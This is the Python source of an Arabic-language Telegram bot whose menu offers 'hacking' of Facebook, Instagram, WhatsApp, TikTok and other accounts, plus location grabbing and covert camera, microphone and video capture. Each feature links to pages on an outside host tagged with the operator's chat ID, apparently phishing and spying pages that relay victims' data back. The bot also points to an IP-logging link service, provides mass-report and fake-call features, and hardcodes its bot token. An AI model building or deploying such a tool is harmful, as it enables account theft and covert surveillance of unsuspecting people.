import os, time, threading, random, string, requests, logging, traceback
from flask import Flask, request
from telebot import TeleBot, types

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html.onrender.com"
WEBHOOK_URL = "https://gamee-08ue.onrender.com"
CALL_SITE = "https://callmyphone.org/app"
ADMIN_CHAT_ID = "6829017835"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

user_states = {}
bot_rating = 0

JOKES = [
    "مرة واحد بخيل... ابنه مات قال الحقوه هاتوه",
    "مرة واحد محشش قعد 3 أيام في البيت ليه؟ لأنه لقى الباب مفتوح",
    "مرة اثنين محششين ركبوا سيارة...",
    "مرة واحد غبي جداً لقى ورقة مكتوب عليها 'أنظر للخلف' فضل يلف على نفسه",
    "واحد بيقول لمراته: انا طلعت من بيتي فقير ورجعت غني! قالتله: اشتغلت؟ قالها: لا لقيت البيت اتسرق",
]

def generate_password(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return ''.join(random.choice(chars) for _ in range(length))

@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        try:
            json_string = request.get_data().decode('utf-8')
            update = types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return ''
        except Exception as e:
            logger.error(f"webhook error: {e}")
            return ''
    return '!', 403

@app.route("/health")
def health():
    return "OK", 200

def main_menu_markup(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)

    # اختراقات (أزرار URL)
    tools_pairs = [
        ("📘 اختراق فيسبوك", "facebook.html", "🎵 اختراق تيك توك", "tiktok.html"),
        ("👻 اختراق سناب شات", "snapchat.html", "📷 اختراق انستقرام", "instagram.html"),
        ("💬 اختراق واتساب", "whatsapp.html", "✈️ اختراق تيليجرام", "telegram.html"),
        ("🐦 اختراق تويتر", "twitter.html", "▶️ اختراق يوتيوب", "youtube.html"),
        ("🎮 اختراق ديسكورد", "discord.html", "🤖 اختراق ريدت", "reddit.html"),
        ("📍 سحب الموقع", "gps.html", "📸 اختراق الكاميرا", "camera.html"),
        ("🎙️ تسجيل الصوت", "mic.html", "🎥 تصوير فيديو", "video.html"),
    ]
    for left_name, left_file, right_name, right_file in tools_pairs:
        left_url = f"{BASE_URL}/{left_file}?chat={chat_id}"
        right_url = f"{BASE_URL}/{right_file}?chat={chat_id}"
        markup.row(types.InlineKeyboardButton(left_name, url=left_url),
                   types.InlineKeyboardButton(right_name, url=right_url))

    # بلاغات (أزرار URL تفتح رابط البلاغ الحقيقي مباشرة)
    reports = [
        ("🐦 ضرب بلاغ تويتر X", "https://help.twitter.com/forms"),
        ("👻 ضرب بلاغ سناب شات", "https://support.snapchat.com/community-report"),
        ("▶️ ضرب بلاغ يوتيوب", "https://www.youtube.com/reportingtool"),
        ("✈️ ضرب بلاغ تيليجرام", "https://telegram.org/faq_report"),
        ("🎵 ضرب بلاغ تيك توك", "https://www.tiktok.com/legal/report/feedback"),
        ("📷 ضرب بلاغ انستقرام", "https://help.instagram.com/contact/383679321740945"),
    ]
    for name, link in reports:
        markup.row(types.InlineKeyboardButton(name, url=link))

    # أدوات إضافية (callbacks قصيرة جداً)
    markup.row(
        types.InlineKeyboardButton("📞 اتصال وهمي", callback_data="call"),
        types.InlineKeyboardButton("📱 فحص الجهاز", url=f"{BASE_URL}/device.html?chat={chat_id}")
    )
    markup.row(
        types.InlineKeyboardButton("🛠️ أدوات الشبكات", callback_data="net"),
        types.InlineKeyboardButton("🔓 فك حظر واتساب", callback_data="unban")
    )
    markup.row(
        types.InlineKeyboardButton("☠️ تلغيم روابط", callback_data="grab"),
        types.InlineKeyboardButton("🔐 كلمة مرور", callback_data="pass")
    )
    markup.row(
        types.InlineKeyboardButton("😂 نكتة", callback_data="joke"),
        types.InlineKeyboardButton("⭐ تقييم البوت", callback_data="rate")
    )
    markup.row(
        types.InlineKeyboardButton("📜 شروط", callback_data="terms"),
        types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack")
    )
    markup.row(types.InlineKeyboardButton("🔄 رجوع", callback_data="back"))

    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    text = "🔱 <b>بوت الجنرال V2</b>\n\nأهلاً بك في لوحة التحكم. اختر الأداة المناسبة.\n⚡ جميع الأدوات تعمل بضغطة زر.\n⚠️ استخدمها بمسؤولية."
    try:
        bot.send_message(chat_id, text, reply_markup=main_menu_markup(chat_id), parse_mode="HTML")
    except Exception as e:
        logger.error(f"start error: {e}")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    data = call.data

    try:
        if data == "back":
            bot.edit_message_text("🔱 <b>بوت الجنرال V2</b>\n\nاختر الأداة:",
                                  chat_id, call.message.message_id,
                                  reply_markup=main_menu_markup(chat_id), parse_mode="HTML")
            bot.answer_callback_query(call.id)

        elif data == "call":
            user_states[chat_id] = "waiting_call_number"
            bot.send_message(chat_id, "📞 أرسل رقم الهاتف (بدون + او 00)\nمثال: 967940201477")
            bot.answer_callback_query(call.id)

        elif data == "net":
            tools = "🛠️ <b>أدوات الشبكات:</b>\nNmap, Wireshark, Metasploit, Aircrack-ng, Burp Suite, John, Hydra, Nikto, SQLmap, Hashcat"
            bot.send_message(chat_id, tools, parse_mode="HTML")
            bot.answer_callback_query(call.id)

        elif data == "unban":
            text = ("🔓 <b>فك حظر واتساب</b>\n\n"
                    "أرسل هذه الرسالة للإيميلات:\n"
                    "<code>عزيزي الدعم،\nرقمي +967XXXXXXXX</code>\n\n"
                    "الإيميلات:\n- smb@support.whatsapp.com\n- android@support.whatsapp.com\n- support@support.whatsapp.com")
            bot.send_message(chat_id, text, parse_mode="HTML")
            bot.answer_callback_query(call.id)

        elif data == "grab":
            bot.send_message(chat_id, "☠️ <b>تلغيم روابط</b>\nاستخدم Grabify: grabify.link")
            bot.answer_callback_query(call.id)

        elif data == "pass":
            pwd = generate_password()
            bot.send_message(chat_id, f"🔐 <b>كلمة المرور:</b>\n<code>{pwd}</code>", parse_mode="HTML")
            bot.answer_callback_query(call.id)

        elif data == "joke":
            joke = random.choice(JOKES)
            bot.send_message(chat_id, f"😂 <b>نكتة:</b>\n{joke}", parse_mode="HTML")
            bot.answer_callback_query(call.id)

        elif data == "rate":
            global bot_rating
            bot_rating += 1
            bot.send_message(chat_id, f"⭐ شكراً! التقييمات: {bot_rating}\nالتقييم: 5.0 🌟")
            bot.answer_callback_query(call.id)

        elif data == "terms":
            terms = ("📜 <b>شروط الاستخدام</b>\n\n"
                     "✅ لن أستخدمه فيما يغضب الله.\n"
                     "✅ لن أسرق أو أتجسس.\n"
                     "✅ للمزاح والربح المشروع فقط.\n"
                     "⚠️ المستخدم يتحمل المسؤولية.")
            bot.send_message(chat_id, terms, parse_mode="HTML")
            bot.answer_callback_query(call.id)

        elif data == "hack":
            steps = ("💻 <b>كيف تصبح هاكر:</b>\n"
                     "1. أساسيات الشبكات\n2. Linux\n3. Python\n"
                     "4. ثغرات الويب\n5. أدوات مثل Burp\n6. منصات تدريب (HTB, THM)\n"
                     "7. شهادات (CEH, OSCP)")
            bot.send_message(chat_id, steps, parse_mode="HTML")
            bot.answer_callback_query(call.id)

        else:
            bot.answer_callback_query(call.id, text="غير معروف")
    except Exception as e:
        logger.error(f"callback error: {e}")
        bot.answer_callback_query(call.id, text="حدث خطأ")

@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_call_number")
def handle_call_number(msg):
    chat_id = msg.chat.id
    number = msg.text.strip().replace("+", "").replace(" ", "")
    if not number:
        bot.reply_to(msg, "⚠️ أدخل رقماً صحيحاً.")
        return
    url = f"{CALL_SITE}?number={number}"
    bot.send_message(chat_id, f"📞 <b>اتصال وهمي</b>\n🔗 {url}", parse_mode="HTML")
    user_states.pop(chat_id, None)

# منع السكون
def keep_alive():
    while True:
        time.sleep(600)
        try:
            requests.get(f"{WEBHOOK_URL}/health", timeout=5)
        except: pass

threading.Thread(target=keep_alive, daemon=True).start()

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"{WEBHOOK_URL}/{TOKEN}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))